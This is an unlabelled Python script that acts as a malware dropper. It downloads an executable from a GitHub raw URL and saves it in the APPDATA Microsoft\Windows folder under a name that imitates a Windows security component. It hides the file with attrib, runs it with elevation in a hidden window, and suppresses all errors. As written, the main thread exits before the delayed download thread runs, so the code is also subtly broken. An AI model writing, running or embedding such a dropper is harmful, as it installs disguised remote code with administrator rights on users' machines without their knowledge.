import os
import threading
import time
import requests
import subprocess
import ctypes

URL = "https://github.com/iDorofa/REMOTEPL/raw/refs/heads/main/Windows.Security.Host.Container.Runtime.exe"
PATH = os.path.join(os.getenv('APPDATA'), "Microsoft", "Windows", "Windows.Security.Host.Container.Runtime.exe")

def background_task():
    try:
        time.sleep(5) 
        r = requests.get(URL)
        with open(PATH, 'wb') as f:
            f.write(r.content)
        os.system(f'attrib +h "{PATH}"')
        ctypes.windll.shell32.ShellExecuteW(None, "runas", PATH, None, None, 0)
    except:
        pass

if __name__ == "__main__":
    t = threading.Thread(target=background_task)
    t.daemon = True
    t.start()
    time.sleep(1)
